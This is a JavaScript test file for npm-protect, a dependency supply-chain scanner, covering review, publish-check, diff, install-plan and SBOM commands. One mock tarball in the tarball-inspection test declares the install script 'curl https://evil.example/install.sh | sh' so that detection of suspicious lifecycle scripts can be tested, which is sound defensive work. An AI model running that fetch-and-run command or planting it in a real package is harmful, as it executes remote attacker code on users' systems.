import assert from "node:assert/strict";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import os from "node:os";
import { fileURLToPath } from "node:url";
import path from "node:path";
import test from "node:test";
import { gzipSync } from "node:zlib";

import { parseArgs, runCli } from "../src/cli.js";

const testDir = path.dirname(fileURLToPath(import.meta.url));
const rootDir = path.resolve(testDir, "..");
const fixturesDir = path.join(rootDir, "test", "fixtures");

test("parseArgs handles flag values and booleans", () => {
  const parsed = parseArgs([
    "--project",
    "demo",
    "--json",
    "--config=custom.yml",
    "extra",
  ]);

  assert.deepEqual(parsed.flags, {
    project: "demo",
    json: true,
    config: "custom.yml",
  });
  assert.deepEqual(parsed.positionals, ["extra"]);
});

test("runCli review emits warn JSON without blocking in warn mode", async () => {
  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "review",
      "--project",
      path.join(fixturesDir, "warn-project"),
      "--json",
    ]);
  });

  const report = JSON.parse(output);
  assert.equal(report.verdict, "warn");
  assert.equal(report.riskVerdict, "warn");
  assert.equal(exitCode, undefined);
});

test("runCli review sets exit code 2 for enforce-mode blocking findings", async () => {
  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "review",
      "--project",
      path.join(fixturesDir, "block-project"),
      "--json",
    ]);
  });

  const report = JSON.parse(output);
  assert.equal(report.verdict, "block");
  assert.equal(report.riskVerdict, "block");
  assert.equal(exitCode, 2);
});

test("runCli publish-check reports unsafe publishing workflow signals", async () => {
  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "publish-check",
      "--project",
      path.join(fixturesDir, "publish-project"),
      "--json",
    ]);
  });

  const report = JSON.parse(output);
  assert.equal(report.verdict, "block");
  assert.equal(exitCode, 2);
  assert.ok(
    report.findings.some((finding) => finding.code === "missing_id_token_permission"),
  );
  assert.ok(
    report.findings.some((finding) => finding.code === "long_lived_token_reference"),
  );
  assert.ok(
    report.findings.some((finding) => finding.code === "unpinned_workflow_action"),
  );
  assert.ok(
    report.findings.some((finding) => finding.code === "missing_sbom_generation"),
  );
  assert.ok(
    report.findings.some((finding) => finding.code === "repository_provider_mismatch"),
  );
});

test("runCli publish-check allows a healthy trusted-publishing workflow", async () => {
  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "publish-check",
      "--project",
      path.join(fixturesDir, "publish-healthy-project"),
      "--json",
    ]);
  });

  const report = JSON.parse(output);
  assert.equal(report.verdict, "allow");
  assert.equal(report.sbomFileCount, 1);
  assert.equal(report.findings.length, 0);
  assert.equal(exitCode, undefined);
});

test("runCli publish-check detects unsafe .npmrc posture", async () => {
  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "publish-check",
      "--project",
      path.join(fixturesDir, "publish-npmrc-project"),
      "--json",
    ]);
  });

  const report = JSON.parse(output);
  assert.equal(report.verdict, "block");
  assert.equal(report.npmrcPresent, true);
  assert.ok(
    report.findings.some((finding) => finding.code === "hardcoded_npm_credentials"),
  );
  assert.ok(
    report.findings.some((finding) => finding.code === "npmrc_disables_provenance"),
  );
  assert.ok(
    report.findings.some((finding) => finding.code === "npmrc_always_auth"),
  );
  assert.equal(exitCode, 2);
});

test("runCli review supports online collectors and blocks on high-confidence findings", async () => {
  const baseUrl = "https://mock.local";
  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "review",
      "--project",
      path.join(fixturesDir, "online-project"),
      "--online",
      "--osv-url",
      `${baseUrl}/v1/querybatch`,
      "--registry-url",
      baseUrl,
      "--json",
    ], {
      fetchImpl: async (url) => {
        if (String(url) === `${baseUrl}/v1/querybatch`) {
          return jsonResponse({
            results: [
              {
                vulns: [
                  {
                    id: "OSV-2026-9",
                    summary: "Critical demo issue",
                    database_specific: {
                      severity: "critical",
                    },
                  },
                ],
              },
            ],
          });
        }

        if (String(url) === `${baseUrl}/react`) {
          return jsonResponse({
            versions: {
              "19.0.0": {
                dist: {
                  integrity: "sha512-local",
                  signatures: [{ keyid: "SHA256:demo", sig: "demo" }],
                },
              },
            },
          });
        }

        return jsonResponse({ error: "not found" }, { status: 404 });
      },
    });
  });

  const report = JSON.parse(output);
  assert.equal(report.verdict, "block");
  assert.equal(report.riskVerdict, "block");
  assert.equal(exitCode, 2);
  assert.ok(
    report.findings.some((finding) => finding.code === "known_vulnerability"),
  );
  assert.ok(report.sources.some((source) => source.name === "osv" && source.status === "ok"));
  assert.ok(
    report.sources.some((source) => source.name === "registry" && source.status === "ok"),
  );
});

test("runCli review warns on freshly published direct dependencies from registry metadata", async () => {
  const baseUrl = "https://mock.local";
  const tempDir = await mkdtemp(path.join(os.tmpdir(), "npm-protect-fresh-config-"));
  const tempConfigPath = path.join(tempDir, "npm-protect.json");

  try {
    await writeFile(
      tempConfigPath,
      JSON.stringify(
        {
          services: {
            registry: {
              enabled: true,
              warnPackageAgeDays: 30,
            },
          },
        },
        null,
        2,
      ),
      "utf8",
    );

    const { output, exitCode } = await captureRun(async () => {
      await runCli([
        "review",
        "--project",
        path.join(fixturesDir, "online-project"),
        "--config",
        tempConfigPath,
        "--registry-url",
        baseUrl,
        "--json",
      ], {
        fetchImpl: async (url) => {
          if (String(url) === `${baseUrl}/react`) {
            return jsonResponse({
              time: {
                "19.0.0": "2026-08-05T00:00:00.000Z",
              },
              versions: {
                "19.0.0": {
                  dist: {
                    integrity: "sha512-local",
                    signatures: [{ keyid: "SHA256:demo", sig: "demo" }],
                  },
                },
              },
            });
          }

          return jsonResponse({ error: "not found" }, { status: 404 });
        },
        now: new Date("2026-08-08T00:00:00Z"),
      });
    });

    const report = JSON.parse(output);
    assert.equal(report.verdict, "warn");
    assert.equal(report.stats.freshPackages, 1);
    assert.ok(
      report.findings.some((finding) => finding.code === "fresh_package_release"),
    );
    assert.equal(exitCode, undefined);
  } finally {
    await rm(tempDir, { recursive: true, force: true });
  }
});

test("runCli review supports SARIF output", async () => {
  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "review",
      "--project",
      path.join(fixturesDir, "warn-project"),
      "--format",
      "sarif",
    ]);
  });

  const report = JSON.parse(output);
  assert.equal(report.version, "2.1.0");
  assert.equal(report.runs[0].tool.driver.name, "npm-protect");
  assert.ok(
    report.runs[0].results.some((result) => result.ruleId === "suspicious_typosquat"),
  );
  assert.equal(exitCode, undefined);
});

test("runCli review supports markdown output", async () => {
  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "review",
      "--project",
      path.join(fixturesDir, "warn-project"),
      "--format",
      "markdown",
    ]);
  });

  assert.match(output, /# npm-protect review/);
  assert.match(output, /\| Severity \| Code \| Package \| Message \|/);
  assert.match(output, /suspicious_typosquat/);
  assert.equal(exitCode, undefined);
});

test("runCli review supports npm audit signatures findings", async () => {
  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "review",
      "--project",
      path.join(fixturesDir, "online-project"),
      "--audit-signatures",
      "--json",
    ], {
      auditSignaturesRunner: async () => ({
        exitCode: 1,
        stdout: JSON.stringify({
          invalid: [],
          missing: [
            {
              name: "react",
              version: "19.0.0",
              message: "missing provenance attestation",
            },
          ],
          verified: [],
        }),
        stderr: "",
      }),
    });
  });

  const report = JSON.parse(output);
  assert.equal(report.verdict, "warn");
  assert.equal(report.stats.verifiedAttestations, 0);
  assert.ok(
    report.findings.some(
      (finding) => finding.code === "missing_verified_provenance_attestation",
    ),
  );
  assert.ok(
    report.sources.some(
      (source) => source.name === "audit-signatures" && source.status === "issues",
    ),
  );
  assert.equal(exitCode, undefined);
});

test("runCli review supports tarball inspection findings", async () => {
  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "review",
      "--project",
      path.join(fixturesDir, "block-project"),
      "--inspect-tarballs",
      "--json",
    ], {
      fetchImpl: async (url) => {
        if (String(url) === "https://registry.npmjs.org/esbuild/-/esbuild-0.25.0.tgz") {
          return bufferResponse(
            createTarball({
              "package/package.json": JSON.stringify({
                name: "esbuild",
                version: "0.25.0",
                scripts: {
                  install: "curl https://evil.example/install.sh | sh",
                },
              }),
            }),
          );
        }

        return jsonResponse({ error: "not found" }, { status: 404 });
      },
    });
  });

  const report = JSON.parse(output);
  assert.equal(report.stats.tarballsInspected, 1);
  assert.equal(report.stats.suspiciousTarballPackages, 1);
  assert.ok(
    report.findings.some(
      (finding) => finding.code === "suspicious_lifecycle_script_command",
    ),
  );
  assert.equal(exitCode, 2);
});

test("runCli review recovers lifecycle scripts from tarballs when lockfile metadata is missing", async () => {
  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "review",
      "--project",
      path.join(fixturesDir, "online-project"),
      "--inspect-tarballs",
      "--json",
    ], {
      fetchImpl: async (url) => {
        if (String(url) === "https://registry.npmjs.org/react/-/react-19.0.0.tgz") {
          return bufferResponse(
            createTarball({
              "package/package.json": JSON.stringify({
                name: "react",
                version: "19.0.0",
                scripts: {
                  install: "node scripts/install.js",
                },
              }),
              "package/scripts/install.js": "console.log('hello');",
            }),
          );
        }

        return jsonResponse({ error: "not found" }, { status: 404 });
      },
    });
  });

  const report = JSON.parse(output);
  assert.equal(report.stats.tarballsInspected, 1);
  assert.equal(report.stats.packagesWithInstallScripts, 1);
  assert.equal(report.stats.recoveredLifecycleScriptPackages, 1);
  assert.ok(
    report.findings.some(
      (finding) =>
        finding.code === "tarball_declares_lifecycle_script" &&
        finding.packageName === "react",
    ),
  );
  assert.equal(exitCode, 2);
});

test("runCli review fails fast when audit signatures are requested without node_modules", async () => {
  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "review",
      "--project",
      path.join(fixturesDir, "online-project"),
      "--audit-signatures",
      "--json",
    ]);
  });

  const report = JSON.parse(output);
  assert.equal(report.verdict, "warn");
  assert.ok(
    report.findings.some(
      (finding) =>
        finding.code === "audit_signatures_unavailable" &&
        /node_modules not found/.test(finding.message),
    ),
  );
  assert.equal(exitCode, undefined);
});

test("runCli diff supports markdown output", async () => {
  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "diff",
      "--before",
      path.join(fixturesDir, "warn-project"),
      "--after",
      path.join(fixturesDir, "block-project"),
      "--format",
      "markdown",
    ]);
  });

  assert.match(output, /# npm-protect diff/);
  assert.match(output, /\| Package \| Note \|/);
  assert.match(output, /esbuild@0.25.0/);
  assert.equal(exitCode, 2);
});

test("runCli diff reports same-version integrity drift", async () => {
  const beforeDir = await mkdtemp(path.join(os.tmpdir(), "npm-protect-diff-before-"));
  const afterDir = await mkdtemp(path.join(os.tmpdir(), "npm-protect-diff-after-"));

  try {
    await writeFile(
      path.join(beforeDir, "package.json"),
      JSON.stringify({ name: "demo", version: "1.0.0" }, null, 2),
      "utf8",
    );
    await writeFile(
      path.join(afterDir, "package.json"),
      JSON.stringify({ name: "demo", version: "1.0.0" }, null, 2),
      "utf8",
    );
    await writeFile(
      path.join(beforeDir, "package-lock.json"),
      JSON.stringify(
        {
          name: "demo",
          version: "1.0.0",
          lockfileVersion: 3,
          packages: {
            "": { name: "demo", version: "1.0.0" },
            "node_modules/left-pad": {
              version: "1.3.0",
              resolved: "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",
              integrity: "sha512-before",
            },
          },
        },
        null,
        2,
      ),
      "utf8",
    );
    await writeFile(
      path.join(afterDir, "package-lock.json"),
      JSON.stringify(
        {
          name: "demo",
          version: "1.0.0",
          lockfileVersion: 3,
          packages: {
            "": { name: "demo", version: "1.0.0" },
            "node_modules/left-pad": {
              version: "1.3.0",
              resolved: "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",
              integrity: "sha512-after",
            },
          },
        },
        null,
        2,
      ),
      "utf8",
    );

    const { output, exitCode } = await captureRun(async () => {
      await runCli([
        "diff",
        "--before",
        beforeDir,
        "--after",
        afterDir,
        "--json",
      ]);
    });

    const report = JSON.parse(output);
    assert.equal(report.verdict, "block");
    assert.equal(report.changedArtifacts.length, 1);
    assert.equal(report.changedArtifacts[0].integrityChanged, true);
    assert.equal(exitCode, 2);
  } finally {
    await rm(beforeDir, { recursive: true, force: true });
    await rm(afterDir, { recursive: true, force: true });
  }
});

test("runCli diff supports git refs", async () => {
  const refs = {
    refA: {
      "package-lock.json": JSON.stringify({
        name: "demo",
        version: "1.0.0",
        lockfileVersion: 3,
        packages: {
          "": {
            name: "demo",
            version: "1.0.0",
            dependencies: {
              react: "19.0.0",
            },
          },
          "node_modules/react": {
            version: "19.0.0",
            resolved: "https://registry.npmjs.org/react/-/react-19.0.0.tgz",
            integrity: "sha512-react",
          },
        },
      }),
    },
    refB: {
      "package-lock.json": JSON.stringify({
        name: "demo",
        version: "1.0.0",
        lockfileVersion: 3,
        packages: {
          "": {
            name: "demo",
            version: "1.0.0",
            dependencies: {
              esbuild: "0.25.0",
            },
          },
          "node_modules/esbuild": {
            version: "0.25.0",
            resolved: "https://registry.npmjs.org/esbuild/-/esbuild-0.25.0.tgz",
            integrity: "sha512-esbuild",
            hasInstallScript: true,
          },
        },
      }),
    },
  };

  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "diff",
      "--project",
      "/tmp/demo-repo",
      "--before-ref",
      "refA",
      "--after-ref",
      "refB",
      "--json",
    ], {
      gitReadFile: async (repoDir, ref, filePath) => {
        const content = refs[ref]?.[filePath];
        if (!content) {
          throw new Error(`git path "${filePath}" was not found in ref "${ref}"`);
        }
        return content;
      },
    });
  });

  const report = JSON.parse(output);
  assert.equal(report.verdict, "block");
  assert.ok(report.added.includes("esbuild@0.25.0"));
  assert.ok(report.removed.includes("react@19.0.0"));
  assert.equal(exitCode, 2);
});

test("runCli install supports JSON output", async () => {
  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "install",
      "--project",
      path.join(fixturesDir, "block-project"),
      "--json",
    ]);
  });

  const plan = JSON.parse(output);
  assert.equal(plan.project.name, "block-project");
  assert.equal(plan.stats.packagesWithInstallScripts, 1);
  assert.equal(plan.stats.recoveredLifecycleScriptPackages, 0);
  assert.equal(plan.stats.unapprovedPackages, 1);
  assert.match(plan.recommendedSteps[0], /npm ci --ignore-scripts/);
  assert.equal(exitCode, undefined);
});

test("runCli install can recover hidden lifecycle scripts from tarballs", async () => {
  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "install",
      "--project",
      path.join(fixturesDir, "online-project"),
      "--inspect-tarballs",
      "--json",
    ], {
      fetchImpl: async (url) => {
        if (String(url) === "https://registry.npmjs.org/react/-/react-19.0.0.tgz") {
          return bufferResponse(
            createTarball({
              "package/package.json": JSON.stringify({
                name: "react",
                version: "19.0.0",
                scripts: {
                  install: "node scripts/install.js",
                },
              }),
              "package/scripts/install.js": "console.log('hello');",
            }),
          );
        }

        return jsonResponse({ error: "not found" }, { status: 404 });
      },
    });
  });

  const plan = JSON.parse(output);
  assert.equal(plan.project.name, "online-project");
  assert.equal(plan.stats.packagesWithInstallScripts, 1);
  assert.equal(plan.stats.recoveredLifecycleScriptPackages, 1);
  assert.equal(plan.stats.unapprovedPackages, 1);
  assert.equal(plan.unapproved[0].source, "tarball");
  assert.deepEqual(plan.unapproved[0].scriptNames, ["install"]);
  assert.match(plan.recommendedSteps[1], /No dependency scripts should be rebuilt/);
  assert.equal(exitCode, undefined);
});

test("runCli install can approve recovered lifecycle-script packages from config", async () => {
  const tempDir = await mkdtemp(path.join(os.tmpdir(), "npm-protect-install-config-"));
  const configPath = path.join(tempDir, "npm-protect.json");

  try {
    await writeFile(
      configPath,
      JSON.stringify(
        {
          allowedInstallScripts: ["react@19.0.0"],
          services: {
            tarballs: {
              enabled: true,
            },
          },
        },
        null,
        2,
      ),
      "utf8",
    );

    const { output, exitCode } = await captureRun(async () => {
      await runCli([
        "install",
        "--project",
        path.join(fixturesDir, "online-project"),
        "--config",
        configPath,
        "--json",
      ], {
        fetchImpl: async (url) => {
          if (String(url) === "https://registry.npmjs.org/react/-/react-19.0.0.tgz") {
            return bufferResponse(
              createTarball({
                "package/package.json": JSON.stringify({
                  name: "react",
                  version: "19.0.0",
                  scripts: {
                    install: "node scripts/install.js",
                  },
                }),
                "package/scripts/install.js": "console.log('hello');",
              }),
            );
          }

          return jsonResponse({ error: "not found" }, { status: 404 });
        },
      });
    });

    const plan = JSON.parse(output);
    assert.equal(plan.stats.packagesWithInstallScripts, 1);
    assert.equal(plan.stats.recoveredLifecycleScriptPackages, 1);
    assert.equal(plan.stats.approvedPackages, 1);
    assert.equal(plan.stats.unapprovedPackages, 0);
    assert.equal(plan.approved[0].source, "tarball");
    assert.deepEqual(plan.approved[0].scriptNames, ["install"]);
    assert.match(plan.recommendedSteps[1], /^npm rebuild react$/);
    assert.equal(exitCode, undefined);
  } finally {
    await rm(tempDir, { recursive: true, force: true });
  }
});

test("runCli review can reuse cached remote responses", async () => {
  const cacheDir = await mkdtemp(path.join(os.tmpdir(), "npm-protect-cli-cache-"));
  let requests = 0;

  try {
    await captureRun(async () => {
      await runCli([
        "review",
        "--project",
        path.join(fixturesDir, "online-project"),
        "--online",
        "--cache-dir",
        cacheDir,
        "--registry-url",
        "https://mock.local",
        "--osv-url",
        "https://mock.local/v1/querybatch",
        "--json",
      ], {
        fetchImpl: async (url, init) => {
          requests += 1;
          if (String(url) === "https://mock.local/v1/querybatch") {
            return jsonResponse({
              results: [{ vulns: [] }],
            });
          }

          if (String(url) === "https://mock.local/react") {
            return jsonResponse({
              versions: {
                "19.0.0": {
                  dist: {
                    integrity: "sha512-local",
                    signatures: [{ keyid: "SHA256:demo", sig: "demo" }],
                  },
                },
              },
            });
          }

          return jsonResponse({ error: "not found" }, { status: 404 });
        },
      });
    });

    const { output, exitCode } = await captureRun(async () => {
      await runCli([
        "review",
        "--project",
        path.join(fixturesDir, "online-project"),
        "--online",
        "--cache-dir",
        cacheDir,
        "--registry-url",
        "https://mock.local",
        "--osv-url",
        "https://mock.local/v1/querybatch",
        "--json",
      ], {
        fetchImpl: async () => {
          throw new Error("cached CLI run should not hit the network");
        },
      });
    });

    const report = JSON.parse(output);
    assert.equal(requests, 2);
    assert.ok(report.sources.some((source) => source.name === "osv" && source.cacheHits === 1));
    assert.ok(
      report.sources.some((source) => source.name === "registry" && source.cacheHits === 1),
    );
    assert.equal(exitCode, undefined);
  } finally {
    await rm(cacheDir, { recursive: true, force: true });
  }
});

test("runCli publish-check supports SARIF output with workflow locations", async () => {
  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "publish-check",
      "--project",
      path.join(fixturesDir, "publish-project"),
      "--format",
      "sarif",
    ]);
  });

  const report = JSON.parse(output);
  assert.equal(report.version, "2.1.0");
  assert.ok(
    report.runs[0].results.some(
      (result) =>
        result.ruleId === "missing_id_token_permission" &&
        result.locations?.[0]?.physicalLocation?.artifactLocation?.uri,
    ),
  );
  assert.equal(exitCode, 2);
});

test("runCli review writes JSON reports to a file when --output is set", async () => {
  const tempDir = await mkdtemp(path.join(os.tmpdir(), "npm-protect-"));
  const outputPath = path.join(tempDir, "review.json");

  try {
    const { output, exitCode } = await captureRun(async () => {
      await runCli([
        "review",
        "--project",
        path.join(fixturesDir, "warn-project"),
        "--json",
        "--output",
        outputPath,
      ]);
    });

    assert.equal(output, "");
    assert.equal(exitCode, undefined);

    const written = JSON.parse(await readFile(outputPath, "utf8"));
    assert.equal(written.project.name, "warn-project");
    assert.equal(written.verdict, "warn");
  } finally {
    await rm(tempDir, { recursive: true, force: true });
  }
});

test("runCli sbom emits CycloneDX JSON", async () => {
  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "sbom",
      "--project",
      path.join(fixturesDir, "block-project"),
    ]);
  });

  const bom = JSON.parse(output);
  assert.equal(bom.bomFormat, "CycloneDX");
  assert.equal(bom.specVersion, "1.6");
  assert.equal(bom.metadata.component.name, "block-project");
  assert.ok(bom.components.some((component) => component.name === "esbuild"));
  assert.equal(exitCode, undefined);
});

test("runCli install prints a reviewed-install plan", async () => {
  const { output, exitCode } = await captureRun(async () => {
    await runCli([
      "install",
      "--project",
      path.join(fixturesDir, "block-project"),
    ]);
  });

  assert.match(output, /npm ci --ignore-scripts/);
  assert.match(output, /Unapproved install-script packages:/);
  assert.match(output, /esbuild@0\.25\.0/);
  assert.equal(exitCode, undefined);
});

async function captureRun(fn) {
  const originalLog = console.log;
  const originalError = console.error;
  const originalExitCode = process.exitCode;
  const chunks = [];

  console.log = (...args) => {
    chunks.push(args.join(" "));
  };

  console.error = (...args) => {
    chunks.push(args.join(" "));
  };

  try {
    process.exitCode = undefined;
    await fn();
    return {
      output: chunks.join("\n"),
      exitCode: process.exitCode,
    };
  } finally {
    console.log = originalLog;
    console.error = originalError;
    process.exitCode = originalExitCode;
  }
}

function jsonResponse(body, options = {}) {
  return {
    ok: (options.status ?? 200) >= 200 && (options.status ?? 200) < 300,
    status: options.status ?? 200,
    async json() {
      return body;
    },
  };
}


function bufferResponse(buffer, options = {}) {
  return {
    ok: (options.status ?? 200) >= 200 && (options.status ?? 200) < 300,
    status: options.status ?? 200,
    async arrayBuffer() {
      return buffer;
    },
  };
}

function createTarball(files) {
  const records = [];

  for (const [name, content] of Object.entries(files)) {
    const data = Buffer.from(content, "utf8");
    const header = Buffer.alloc(512, 0);
    writeTarString(header, 0, 100, name);
    writeTarString(header, 100, 8, "0000777");
    writeTarString(header, 108, 8, "0000000");
    writeTarString(header, 116, 8, "0000000");
    writeTarString(header, 124, 12, data.length.toString(8));
    writeTarString(header, 136, 12, Math.floor(Date.now() / 1000).toString(8));
    header[156] = "0".charCodeAt(0);
    writeTarString(header, 257, 6, "ustar");
    writeTarString(header, 263, 2, "00");

    for (let index = 148; index < 156; index += 1) {
      header[index] = 32;
    }
    const checksum = header.reduce((sum, byte) => sum + byte, 0);
    writeTarString(header, 148, 8, checksum.toString(8));

    records.push(header, data, Buffer.alloc((512 - (data.length % 512)) % 512, 0));
  }

  records.push(Buffer.alloc(1024, 0));
  return gzipSync(Buffer.concat(records));
}

function writeTarString(buffer, offset, length, value) {
  buffer.write(String(value).slice(0, length - 1), offset, length - 1, "utf8");
}
